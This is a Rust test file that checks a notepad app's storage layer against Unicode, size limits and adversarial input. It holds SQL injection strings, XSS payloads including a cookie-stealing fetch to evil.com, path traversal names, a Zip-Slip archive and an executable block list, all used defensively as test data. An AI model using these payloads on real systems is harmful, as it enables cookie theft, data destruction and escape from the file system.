mod common;

use std::fs::{self, File};
use std::io::Write;
use std::path::Path;

use personal_notepad_lib::storage::{
    attachment_storage::{sanitize_original_filename, AttachmentStorage},
    crypto::{CryptoSession, SetupEncryptionDto},
    errors::{AttachmentError, ImportExportError, StorageError},
    limits::{
        validate_note_content, validate_notebook_name, validate_tag_name, MAX_NOTE_CONTENT_BYTES,
    },
    models::{
        BackupRestoreRequest, CreateNoteDto, CreateNotebookDto, ExportBatchRequest, ExportFormat,
        ExportScope, ImportFormat, LinkTargetLifecycle, Note,
    },
    paths::StoragePaths,
    repositories::{NoteRepository, NotebookRepository, SearchRepository, TagRepository},
    services::{
        AttachmentService, ImportExportService, InternalLinkService, LinkParser, ManifestManager,
        RestoreService,
    },
};
use rusqlite::params;
use zip::write::SimpleFileOptions;
use zip::ZipWriter;

use common::{lock_process_global_test_state, TestAppDir};

// =============================================================================
// Task 18 — Test Unicode, Input Validation, and Adversarial Test Data
// =============================================================================

/// 1. Verifies multilingual Unicode, emoji, combining characters, and non-Latin scripts roundtrip faithfully.
#[test]
fn test_unicode_multilingual_emoji_combining_characters_and_bidi_roundtrip() {
    let app_dir = TestAppDir::new();
    let conn = app_dir.open_migrated_database();

    // 1. Prepare representative multilingual and symbol payloads
    let devanagari = "नमस्ते दुनिया! यह एक सुरक्षित नोट है।";
    let japanese = "日本語のノート 漢字・ひらがな・カタカナ 第12章";
    let korean = "한국어 메모 테스트 2026 시스템";
    let arabic = "مرحبا بالعالم! هذا اختبار للنص العربي مع علامات التشكيل";
    let hebrew = "שלום עולם! בדיקת טקסט בעברית";
    let greek = "Γεια σου κόσμε! Ελληνικό κείμενο με τόνους";
    let cyrillic = "Привет, мир! Тестирование кодировки UTF-8 и целостности данных";
    let combining = "Caf\u{0065}\u{0301} r\u{0065}\u{0301}sum\u{0065}\u{0301} na\u{00ef}ve se\u{00f1}or gar\u{00e7}on fa\u{00e7}ade";
    let complex_emojis = "👨‍👩‍👧‍👦 👩🏽‍💻 🏳️‍🌈 🚀 ✨ 💡 🎯 🔬";
    let math_symbols = "∀x ∈ ℝ, ∃y : x² + y² = 1 ∧ ¬(p ∨ q) ∏ ∑ ∫";

    let combined_title = format!("🌐 Unicode Test: {} - {}", devanagari, complex_emojis);
    let combined_content = format!(
        "{}\n{}\n{}\n{}\n{}\n{}\n{}\n{}\n{}\n{}",
        devanagari,
        japanese,
        korean,
        arabic,
        hebrew,
        greek,
        cyrillic,
        combining,
        complex_emojis,
        math_symbols
    );

    let note = NoteRepository::create(
        &conn,
        CreateNoteDto {
            title: Some(combined_title.clone()),
            content: Some(combined_content.clone()),
            ..Default::default()
        },
    )
    .expect("create note with complex unicode");

    // 2. Re-query the note from database to verify bit-for-bit fidelity
    let fetched = NoteRepository::get_by_id(&conn, &note.id)
        .expect("query note")
        .expect("note must exist");

    assert_eq!(fetched.title, combined_title);
    assert_eq!(fetched.content, combined_content);
    assert_eq!(
        fetched.title.chars().count(),
        combined_title.chars().count()
    );
    assert_eq!(fetched.content.len(), combined_content.len());
}

/// 2. Verifies Right-to-Left (RTL) and mixed BiDi text indexing and full-text search.
#[test]
fn test_rtl_and_mixed_bidi_text_content_and_search() {
    let app_dir = TestAppDir::new();
    let conn = app_dir.open_migrated_database();

    let title = "مشروع 2026: Modern API Architecture";
    let content =
        "هذا توثيق لنظام SQLite وقاعدة البيانات مع 100% data integrity و RESTful endpoints.";

    let note = NoteRepository::create(
        &conn,
        CreateNoteDto {
            title: Some(title.to_string()),
            content: Some(content.to_string()),
            ..Default::default()
        },
    )
    .expect("create BiDi note");

    // Search by Arabic term in title
    let results_ar_title =
        SearchRepository::search(&conn, "مشروع", Some(10)).expect("search arabic title");
    assert!(results_ar_title.iter().any(|r| r.note_id == note.id));

    // Search by English term in title
    let results_en_title =
        SearchRepository::search(&conn, "Architecture", Some(10)).expect("search english title");
    assert!(results_en_title.iter().any(|r| r.note_id == note.id));

    // Search by Arabic term in content
    let results_ar_content =
        SearchRepository::search(&conn, "توثيق", Some(10)).expect("search arabic body");
    assert!(results_ar_content.iter().any(|r| r.note_id == note.id));

    // Search by mixed technical token
    let results_token =
        SearchRepository::search(&conn, "endpoints", Some(10)).expect("search token");
    assert!(results_token.iter().any(|r| r.note_id == note.id));
}

/// 3. Verifies boundary behavior for long titles, large note bodies, and unbroken long lines.
#[test]
fn test_long_titles_bodies_and_unbroken_lines() {
    let app_dir = TestAppDir::new();
    let conn = app_dir.open_migrated_database();

    // 1. Exact 500-character title boundary
    let title_500: String = (0..500).map(|_| 'T').collect();
    let note_500 = NoteRepository::create(
        &conn,
        CreateNoteDto {
            title: Some(title_500.clone()),
            content: Some("Valid content".to_string()),
            ..Default::default()
        },
    );
    assert!(
        note_500.is_ok(),
        "Exact 500 character title must be accepted"
    );

    // 2. 501-character title boundary violation
    let title_501: String = (0..501).map(|_| 'T').collect();
    let note_501 = NoteRepository::create(
        &conn,
        CreateNoteDto {
            title: Some(title_501),
            content: Some("Valid content".to_string()),
            ..Default::default()
        },
    );
    assert!(note_501.is_err(), "501 character title must be rejected");
    match note_501.unwrap_err() {
        StorageError::Validation(msg) => {
            assert!(msg.contains("maximum allowed limit of 500 characters"));
        }
        other => panic!("Expected StorageError::Validation, got {:?}", other),
    }

    // 3. Unbroken long line (60,000 continuous characters with zero spaces or newlines)
    let unbroken_line: String = (0..60_000)
        .map(|i| (b'a' + (i % 26) as u8) as char)
        .collect();
    let note_long_line = NoteRepository::create(
        &conn,
        CreateNoteDto {
            title: Some("Unbroken Long Line Note".to_string()),
            content: Some(unbroken_line.clone()),
            ..Default::default()
        },
    )
    .expect("save unbroken 60k character line");

    let retrieved = NoteRepository::get_by_id(&conn, &note_long_line.id)
        .expect("get note")
        .expect("note exists");
    assert_eq!(retrieved.content, unbroken_line);
    assert_eq!(retrieved.content.len(), 60_000);

    // 4. Content size boundary (> 10 MiB)
    assert!(validate_note_content(Some(&unbroken_line)).is_ok());
    let oversized = "x".repeat(MAX_NOTE_CONTENT_BYTES + 1);
    let oversized_err = validate_note_content(Some(&oversized));
    assert!(oversized_err.is_err());
    assert!(oversized_err
        .unwrap_err()
        .to_string()
        .contains("exceeds the maximum allowed limit"));
}

/// 4. Verifies SQL-significant characters remain strictly data and cannot execute SQL commands.
#[test]
fn test_sql_significant_characters_remain_pure_data() {
    let app_dir = TestAppDir::new();
    let conn = app_dir.open_migrated_database();

    // SQL injection payloads targeting titles, content, and queries
    let sql_payloads = [
        "'; DROP TABLE notes; --",
        "\" OR \"1\"=\"1",
        "' UNION SELECT id, title, content, format, notebook_id, created_at, modified_at, 0, 0, 0, NULL FROM notes --",
        "/* SQL Block Comment */ '; DELETE FROM notebooks; --",
        "Robert'); DROP TABLE Students;--",
        "backslash \\' quote and null \\0 byte test",
    ];

    for (idx, payload) in sql_payloads.iter().enumerate() {
        let note = NoteRepository::create(
            &conn,
            CreateNoteDto {
                title: Some(format!("Payload #{idx}: {payload}")),
                content: Some(format!("Content payload: {payload}")),
                ..Default::default()
            },
        )
        .expect("payload must be stored safely as data");

        // Verify data round-trip
        let fetched = NoteRepository::get_by_id(&conn, &note.id)
            .expect("fetch note")
            .expect("note must exist");
        assert_eq!(fetched.title, format!("Payload #{idx}: {payload}"));
        assert_eq!(fetched.content, format!("Content payload: {payload}"));
    }

    // Verify notes table was NEVER dropped or altered
    let count: i64 = conn
        .query_row("SELECT count(*) FROM notes", [], |r| r.get(0))
        .expect("notes table must be intact");
    assert_eq!(count, sql_payloads.len() as i64);

    // Search query injection test: search should not crash or execute SQL
    let search_res = SearchRepository::search(&conn, "'; DROP TABLE notes; --", Some(10));
    assert!(
        search_res.is_ok(),
        "Search query with SQL syntax must not fail"
    );
}

/// 5. Verifies HTML-like and Markdown-like payloads are preserved verbatim without execution.
#[test]
fn test_html_and_markdown_like_text_preserved_without_execution() {
    let app_dir = TestAppDir::new();
    let conn = app_dir.open_migrated_database();

    let xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=\"fetch('http://evil.com/?c=' + document.cookie)\">",
        "<iframe src=\"javascript:alert('pwned')\"></iframe>",
        "<svg/onload=alert(1)>",
        "<a href=\"javascript:void(0)\" onmouseover=\"alert(1)\">Click me</a>",
    ];

    let malformed_markdown =
        "```rust\nfn unclosed_block() {\n// no closing code fence\n\n**unclosed bold syntax\n###\n";

    let combined_content = format!("{}\n\n{}", xss_payloads.join("\n"), malformed_markdown);

    let note = NoteRepository::create(
        &conn,
        CreateNoteDto {
            title: Some("<script>alert('title')</script>".to_string()),
            content: Some(combined_content.clone()),
            ..Default::default()
        },
    )
    .expect("create note with XSS and malformed markdown");

    let fetched = NoteRepository::get_by_id(&conn, &note.id)
        .expect("get note")
        .expect("note exists");

    assert_eq!(fetched.title, "<script>alert('title')</script>");
    assert_eq!(fetched.content, combined_content);
}

/// 6. Verifies malformed, traversal, and adversarial internal-link patterns.
#[test]
fn test_malformed_and_adversarial_internal_link_patterns() {
    let app_dir = TestAppDir::new();
    let conn = app_dir.open_migrated_database();

    // 1. Create a legitimate target note
    let valid_target = NoteRepository::create(
        &conn,
        CreateNoteDto {
            title: Some("Valid Target Note".to_string()),
            content: Some("Target content".to_string()),
            ..Default::default()
        },
    )
    .expect("create target");

    // 2. Text containing various malformed, external, and adversarial link syntax
    let adversarial_markdown = format!(
        concat!(
            "1. Classic wiki link: [[WikiNote]]\n",
            "2. Missing target ID: [Empty](notepad://note/)\n",
            "3. Traversal target ID: [Escape](notepad://note/../../etc/passwd)\n",
            "4. Script scheme: [XSS](javascript:alert(1))\n",
            "5. Local file scheme: [Password](file:///etc/passwd)\n",
            "6. Web scheme: [External](https://example.com)\n",
            "7. Markdown image: ![Alt Text](notepad://note/{})\n",
            "8. Unclosed brackets: [Broken Link(notepad://note/foo)\n",
            "9. Traversal in brackets: [..\\..\\bad](notepad://note/{})\n",
            "10. Valid internal link: [Legit Target](notepad://note/{})\n",
        ),
        valid_target.id, valid_target.id, valid_target.id
    );

    let parsed_links = LinkParser::parse_internal_links(&adversarial_markdown);

    // Only the valid internal link and the one with traversal in the label should be parsed;
    // but the target ID for both must be exactly valid_target.id!
    assert!(!parsed_links.is_empty());
    for link in &parsed_links {
        assert_eq!(link.target_id, valid_target.id);
        // None of the malicious schemes or traversal IDs should have been accepted as target_id
        assert_ne!(link.target_id, "../../etc/passwd");
        assert_ne!(link.target_id, "javascript:alert(1)");
    }

    // 3. Test resolve_link_target with adversarial IDs directly
    let traversal_resolution = InternalLinkService::resolve_link_target(&conn, "../../etc/passwd")
        .expect("resolve must not error");
    assert_eq!(traversal_resolution.lifecycle, LinkTargetLifecycle::Missing);

    let backslash_traversal =
        InternalLinkService::resolve_link_target(&conn, "..\\..\\windows\\system32")
            .expect("resolve must not error");
    assert_eq!(backslash_traversal.lifecycle, LinkTargetLifecycle::Missing);

    let empty_resolution =
        InternalLinkService::resolve_link_target(&conn, "   ").expect("resolve must not error");
    assert_eq!(empty_resolution.lifecycle, LinkTargetLifecycle::Missing);

    // Valid target resolves cleanly
    let valid_resolution = InternalLinkService::resolve_link_target(&conn, &valid_target.id)
        .expect("resolve valid target");
    assert_eq!(valid_resolution.lifecycle, LinkTargetLifecycle::Active);
    assert_eq!(valid_resolution.title.as_deref(), Some("Valid Target Note"));
}

/// 7. Verifies path traversal strings in attachment names and managed paths are neutralized.
#[test]
fn test_path_traversal_strings_in_attachments_and_paths() {
    let app_dir = TestAppDir::new();

    // 1. Filename sanitization against traversal sequences
    assert_eq!(
        sanitize_original_filename("../../../../etc/passwd"),
        "passwd"
    );
    assert_eq!(
        sanitize_original_filename("..\\..\\windows\\system32\\calc.exe"),
        "calc.exe"
    );
    assert_eq!(
        sanitize_original_filename("/tmp/exploit.txt"),
        "exploit.txt"
    );
    assert_eq!(
        sanitize_original_filename("C:\\Windows\\System32\\config.sys"),
        "config.sys"
    );
    assert_eq!(
        sanitize_original_filename("subdir/nested/document.pdf"),
        "document.pdf"
    );
    assert_eq!(sanitize_original_filename(""), "attachment");
    assert_eq!(sanitize_original_filename("   "), "attachment");

    // Control characters (\0, \r, \n) must be filtered out
    let null_byte_name = "secret\0_document\r\n.pdf";
    let sanitized_null = sanitize_original_filename(null_byte_name);
    assert!(!sanitized_null.contains('\0'));
    assert!(!sanitized_null.contains('\r'));
    assert!(!sanitized_null.contains('\n'));
    assert_eq!(sanitized_null, "secret_document.pdf");

    // 2. StoragePaths::sanitize_subpath guarantees no path escapes the base
    let base = &app_dir.paths.attachments_dir;

    let traversal_res = StoragePaths::sanitize_subpath(base, Path::new("../../escaped.txt"));
    assert!(traversal_res.is_err(), "Must reject ParentDir traversal");

    let abs_res = StoragePaths::sanitize_subpath(base, Path::new("/root/secret.db"));
    assert!(abs_res.is_err(), "Must reject RootDir prefix");

    let win_drive_res = StoragePaths::sanitize_subpath(base, Path::new("C:\\Windows\\System32"));
    assert!(win_drive_res.is_err(), "Must reject Windows drive prefix");

    let safe_res = StoragePaths::sanitize_subpath(base, Path::new("note-123/attachment.pdf"));
    assert!(safe_res.is_ok());
    assert!(safe_res.unwrap().starts_with(base));
}

/// 8. Verifies duplicate and conflicting filenames are stored collision-free without data loss.
#[test]
fn test_duplicate_and_conflicting_filenames_handled_collision_free() {
    let _guard = lock_process_global_test_state();
    let app_dir = TestAppDir::new();
    let conn = app_dir.open_migrated_database();
    let storage = AttachmentStorage::new(app_dir.paths.clone());

    let note = NoteRepository::create(
        &conn,
        CreateNoteDto {
            title: Some("Duplicate Filename Test".to_string()),
            ..Default::default()
        },
    )
    .expect("create note");

    // 1. Create two separate source files with the EXACT same filename but different contents
    let temp_src_dir = app_dir.dir.join("temp_src");
    fs::create_dir_all(&temp_src_dir).unwrap();

    let src_file_1 = temp_src_dir.join("contract.pdf");
    fs::write(&src_file_1, b"Contract Version 1 - Preliminary Draft").unwrap();

    let att_1 = AttachmentService::add_attachment(&conn, &storage, &note.id, &src_file_1)
        .expect("add first attachment");

    // Modify source file content and add again with identical filename
    fs::write(&src_file_1, b"Contract Version 2 - Final Approved").unwrap();
    let att_2 = AttachmentService::add_attachment(&conn, &storage, &note.id, &src_file_1)
        .expect("add second attachment with duplicate name");

    // Verify both attachments exist in database with unique IDs and unique relative paths
    assert_ne!(att_1.id, att_2.id);
    assert_ne!(att_1.relative_path, att_2.relative_path);
    assert_eq!(att_1.file_name, "contract.pdf");
    assert_eq!(att_2.file_name, "contract.pdf");

    // Verify both files physically exist on disk and have their distinct contents
    let path_1 = storage.resolve_safe_path(&att_1.relative_path).unwrap();
    let path_2 = storage.resolve_safe_path(&att_2.relative_path).unwrap();
    assert!(path_1.exists());
    assert!(path_2.exists());
    assert_eq!(
        fs::read(&path_1).unwrap(),
        b"Contract Version 1 - Preliminary Draft"
    );
    assert_eq!(
        fs::read(&path_2).unwrap(),
        b"Contract Version 2 - Final Approved"
    );

    // 2. Batch export of notes with identical titles disambiguates filenames
    let note_b = NoteRepository::create(
        &conn,
        CreateNoteDto {
            title: Some("Duplicate Filename Test".to_string()),
            content: Some("Second note with same title".to_string()),
            ..Default::default()
        },
    )
    .expect("create second note with identical title");

    let export_dir = app_dir.dir.join("export_out");
    fs::create_dir_all(&export_dir).unwrap();

    let export_req = ExportBatchRequest {
        operation_id: None,
        scope: Some(ExportScope::SelectedNotes {
            note_ids: vec![note.id.clone(), note_b.id.clone()],
        }),
        note_ids: vec![note.id.clone(), note_b.id.clone()],
        format: ExportFormat::Md,
        destination_dir: export_dir.to_string_lossy().to_string(),
        destination_file: None,
        include_metadata: true,
        overwrite: false,
    };

    let summary = ImportExportService::export_notes_batch(&conn, export_req)
        .expect("export batch with duplicate titles");
    assert_eq!(summary.exported_count, 2);

    let exported_files: Vec<String> = fs::read_dir(&export_dir)
        .unwrap()
        .map(|e| e.unwrap().file_name().to_string_lossy().to_string())
        .collect();

    assert!(exported_files
        .iter()
        .any(|f| f == "Duplicate Filename Test.md"));
    assert!(exported_files
        .iter()
        .any(|f| f == "Duplicate Filename Test (1).md"));
}

/// 9. Verifies extremely long filenames, multi-byte names, and path components are safely bounded.
#[test]
fn test_extremely_long_filenames_and_path_components() {
    let app_dir = TestAppDir::new();
    let conn = app_dir.open_migrated_database();
    let storage = AttachmentStorage::new(app_dir.paths.clone());

    let note = NoteRepository::create(
        &conn,
        CreateNoteDto {
            title: Some("Long Filename Note".to_string()),
            ..Default::default()
        },
    )
    .expect("create note");

    // 1. Filename with 350 ASCII characters
    let long_stem = "a".repeat(340);
    let raw_name_350 = format!("{long_stem}.pdf");
    let sanitized = sanitize_original_filename(&raw_name_350);

    // Must be bounded to 255 characters while preserving the ".pdf" extension
    assert_eq!(sanitized.chars().count(), 255);
    assert!(sanitized.ends_with(".pdf"));

    // 2. Multibyte Unicode filename (150 Japanese Kanji characters = ~450 UTF-8 bytes)
    let kanji_stem = "開発記録文書".repeat(30); // 150 characters
    let kanji_raw = format!("{kanji_stem}.txt");
    let sanitized_kanji = sanitize_original_filename(&kanji_raw);

    // Stored and bounded safely by char count without panicking on UTF-8 boundaries
    assert!(sanitized_kanji.chars().count() <= 255);
    assert!(sanitized_kanji.ends_with(".txt"));

    // 3. Store file with unusually long name into attachment storage
    let temp_file = app_dir.dir.join("test_long.pdf");
    fs::write(&temp_file, b"Long filename test payload").unwrap();

    let att = AttachmentService::add_attachment(&conn, &storage, &note.id, &temp_file)
        .expect("store attachment with long name");

    assert!(storage.file_exists(&att.relative_path));
}

/// 10. Verifies Zip-Slip path traversal and malicious entries in backup archives are rejected.
#[test]
fn test_unsupported_archive_entries_and_zip_slip_rejection() {
    let _guard = lock_process_global_test_state();
    let app_dir = TestAppDir::new();
    let mut conn = app_dir.open_migrated_database();

    // Create a base note
    let _note = NoteRepository::create(
        &conn,
        CreateNoteDto {
            title: Some("Pre-existing Note".to_string()),
            ..Default::default()
        },
    )
    .expect("create note");

    // Construct a malicious ZIP archive with Zip Slip directory traversal
    let malicious_archive = app_dir.dir.join("zip_slip_exploit.zip");
    {
        let file = File::create(&malicious_archive).expect("create zip");
        let mut zip = ZipWriter::new(file);
        let opts = SimpleFileOptions::default();

        // Valid manifest entry
        zip.start_file("manifest.json", opts).unwrap();
        zip.write_all(br#"{"manifest_version": 1, "app": "personal-notepad", "created_at": "2026-01-01T00:00:00Z", "format_version": "1.0", "stats": {"notes_count": 1, "attachments_count": 0, "notebooks_count": 0, "tags_count": 0, "total_size_bytes": 100}, "checksums": {}}"#).unwrap();

        // Malicious traversal entry
        zip.start_file("../../escaped_evil_payload.txt", opts)
            .unwrap();
        zip.write_all(b"PWNED FILESYSTEM PAYLOAD").unwrap();

        // Malicious absolute path entry
        zip.start_file("/absolute/bad_path.txt", opts).unwrap();
        zip.write_all(b"PWNED ABSOLUTE PATH").unwrap();

        zip.finish().expect("finish zip");
    }

    // 1. Verify ManifestManager detects UNSAFE_ARCHIVE_PATH
    let val_res = ManifestManager::validate_archive(&malicious_archive).expect("validate archive");
    assert!(
        !val_res.is_valid,
        "Archive with Zip Slip entries must not be valid"
    );
    assert!(
        val_res
            .issues
            .iter()
            .any(|i| i.code == "UNSAFE_ARCHIVE_PATH"),
        "Expected UNSAFE_ARCHIVE_PATH issue"
    );

    // 2. Verify RestoreService strictly rejects the restore request
    let restore_req = BackupRestoreRequest {
        file_path: malicious_archive.to_string_lossy().to_string(),
        operation_id: Some("op-zip-slip".to_string()),
    };

    let restore_result =
        RestoreService::execute_restore(&mut conn, &app_dir.paths, restore_req, None::<fn(_)>);
    assert!(
        restore_result.is_err(),
        "Restore must fail on Zip Slip archive"
    );

    // 3. Verify that escaped file was NEVER written outside
    assert!(!app_dir
        .dir
        .parent()
        .unwrap()
        .join("escaped_evil_payload.txt")
        .exists());

    // 4. Verify live database is completely preserved
    let notes = NoteRepository::list(&conn, false).expect("list notes");
    assert_eq!(notes.len(), 1);
    assert_eq!(notes[0].title, "Pre-existing Note");
}

/// 11. Verifies executable extension blocklist and binary content rejection.
#[test]
fn test_unexpected_and_blocked_executable_file_types() {
    let app_dir = TestAppDir::new();
    let conn = app_dir.open_migrated_database();
    let storage = AttachmentStorage::new(app_dir.paths.clone());

    // 1. AttachmentStorage executable extension detection
    let blocked = [
        "virus.exe",
        "script.sh",
        "batch.bat",
        "powershell.ps1",
        "installer.msi",
        "macro.vbs",
        "exploit.cmd",
        "code.js",
        "archive.jar",
        "screensaver.scr",
    ];
    for name in blocked {
        assert!(
            AttachmentStorage::is_executable_extension(name),
            "Expected {name} to be identified as blocked executable"
        );
    }

    let allowed = [
        "document.pdf",
        "photo.png",
        "audio.mp3",
        "notes.md",
        "data.csv",
    ];
    for name in allowed {
        assert!(
            !AttachmentStorage::is_executable_extension(name),
            "Expected {name} to NOT be blocked"
        );
    }

    // 2. Attempting to open an attachment with an executable name fails with ExecutableBlocked
    let note = NoteRepository::create(
        &conn,
        CreateNoteDto {
            title: Some("Blocked Executable Note".to_string()),
            ..Default::default()
        },
    )
    .expect("create note");

    let sh_script_path = app_dir.dir.join("deploy.sh");
    fs::write(&sh_script_path, b"#!/bin/sh\necho malicious").unwrap();

    let att = AttachmentService::add_attachment(&conn, &storage, &note.id, &sh_script_path)
        .expect("attach script");

    let open_res = AttachmentService::get_attachment_for_open(&conn, &storage, &att.id);
    assert!(open_res.is_err());
    match open_res.unwrap_err() {
        AttachmentError::ExecutableBlocked(name) => {
            assert_eq!(name, "deploy.sh");
        }
        other => panic!("Expected ExecutableBlocked, got {:?}", other),
    }

    // 3. Binary file content rejection during text import
    let binary_file = app_dir.dir.join("test.bin");
    fs::write(&binary_file, b"\x00\x01\x02\x03\xFF\xFE\x00\x00").unwrap();

    let import_res = ImportExportService::read_and_validate_file(&binary_file, ImportFormat::Txt);
    assert!(import_res.is_err());
    match import_res.unwrap_err() {
        ImportExportError::Validation(msg) => {
            assert!(msg.contains("Binary file content detected"));
        }
        other => panic!("Expected ImportExportError::Validation, got {:?}", other),
    }
}

/// 12. Verifies empty, whitespace-only, and malformed metadata inputs are handled safely.
#[test]
fn test_empty_whitespace_only_and_malformed_metadata_inputs() {
    let app_dir = TestAppDir::new();
    let conn = app_dir.open_migrated_database();

    // 1. Tag name validation
    assert!(validate_tag_name("").is_err());
    assert!(validate_tag_name("   \t\n   ").is_err());
    assert!(validate_tag_name(&"a".repeat(101)).is_err());
    assert!(validate_tag_name("Valid Tag").is_ok());

    let tag_err = TagRepository::create(&conn, "   ");
    assert!(tag_err.is_err(), "Empty/whitespace tag must be rejected");

    // 2. Notebook name validation
    assert!(validate_notebook_name("").is_err());
    assert!(validate_notebook_name("    ").is_err());
    assert!(validate_notebook_name(&"N".repeat(201)).is_err());
    assert!(validate_notebook_name("Valid Notebook").is_ok());

    let nb_err = NotebookRepository::create(
        &conn,
        CreateNotebookDto {
            name: "   ".to_string(),
            parent_id: None,
        },
    );
    assert!(
        nb_err.is_err(),
        "Empty/whitespace notebook name must be rejected"
    );

    // 3. Note with empty or missing title/content defaults gracefully
    let default_title_note = NoteRepository::create(
        &conn,
        CreateNoteDto {
            title: None,
            content: None,
            ..Default::default()
        },
    )
    .expect("create note with None fields");
    assert_eq!(default_title_note.title, "Untitled Note");
    assert_eq!(default_title_note.content, "");

    let empty_title_note = NoteRepository::create(
        &conn,
        CreateNoteDto {
            title: Some("".to_string()),
            content: Some("".to_string()),
            ..Default::default()
        },
    )
    .expect("create note with empty strings");
    assert_eq!(empty_title_note.title, "");
    assert_eq!(empty_title_note.content, "");
}

/// 13. Verifies null-like strings ("null", "undefined", "NaN", "None", "[object Object]") are preserved as literal data.
#[test]
fn test_null_like_strings_preserved_as_literal_data() {
    let app_dir = TestAppDir::new();
    let conn = app_dir.open_migrated_database();

    let null_like_samples = [
        "null",
        "undefined",
        "NaN",
        "None",
        "nil",
        "[object Object]",
        "0",
        "false",
        "true",
    ];

    for sample in null_like_samples {
        let note = NoteRepository::create(
            &conn,
            CreateNoteDto {
                title: Some(sample.to_string()),
                content: Some(format!("Content: {sample}\nSecondary line: {sample}")),
                ..Default::default()
            },
        )
        .expect("create note with null-like title and body");

        let fetched = NoteRepository::get_by_id(&conn, &note.id)
            .expect("fetch note")
            .expect("note must exist");

        assert_eq!(fetched.title, sample);
        assert_eq!(
            fetched.content,
            format!("Content: {sample}\nSecondary line: {sample}")
        );

        // Verify JSON serialization keeps it as a string
        let serialized = serde_json::to_string(&fetched).expect("serialize to json");
        assert!(serialized.contains(&format!("\"title\":\"{sample}\"")));

        let deserialized: Note = serde_json::from_str(&serialized).expect("deserialize from json");
        assert_eq!(deserialized.title, sample);
    }
}

/// 14. Verifies adversarial and unusual content integrity when envelope encryption is active.
#[test]
fn test_adversarial_data_in_encrypted_database_with_dek() {
    let _lock = lock_process_global_test_state();
    let app_dir = TestAppDir::new();
    let conn = app_dir.open_migrated_database();

    // 1. Initialize master password and activate encryption session
    let session = CryptoSession::init_from_database(&conn).expect("init session");
    let password = "SuperSecretMasterKey!2026";
    let _metadata = session
        .setup_encryption(
            &conn,
            &app_dir.paths,
            SetupEncryptionDto {
                password: password.to_string(),
                confirm_password: password.to_string(),
            },
        )
        .expect("setup encryption");

    let dek = session.get_active_dek().expect("active dek");

    // 2. Create note with SQL injection title, XSS payload, and Arabic RTL text
    let adv_title = "'; DROP TABLE notes; -- مشروع 2026";
    let adv_content =
        "<script>alert('XSS')</script>\nهذا نص عربي مع علامات التشكيل\nundefined\n[object Object]";

    let note = NoteRepository::create_with_key(
        &conn,
        CreateNoteDto {
            title: Some(adv_title.to_string()),
            content: Some(adv_content.to_string()),
            ..Default::default()
        },
        Some(&dek),
    )
    .expect("create encrypted note with adversarial data");

    // 3. Raw database query must see ciphertext, never plaintext
    let raw_title: String = conn
        .query_row(
            "SELECT title FROM notes WHERE id = ?1",
            params![note.id],
            |r| r.get(0),
        )
        .expect("query raw title");
    assert!(raw_title.starts_with("ENC$v1$"));
    assert!(!raw_title.contains("DROP TABLE"));

    // 4. Retrieve with DEK: exact parity
    let decrypted = NoteRepository::get_by_id_with_key(&conn, &note.id, Some(&dek))
        .expect("get decrypted note")
        .expect("note exists");
    assert_eq!(decrypted.title, adv_title);
    assert_eq!(decrypted.content, adv_content);

    // 5. Retrieve without DEK (locked state): fails with CryptoError
    let locked_fetch = NoteRepository::get_by_id_with_key(&conn, &note.id, None);
    assert!(locked_fetch.is_err());
    match locked_fetch.unwrap_err() {
        StorageError::Crypto(msg) => {
            assert!(msg.contains("Application is locked"));
        }
        other => panic!("Expected StorageError::Crypto, got {:?}", other),
    }
}
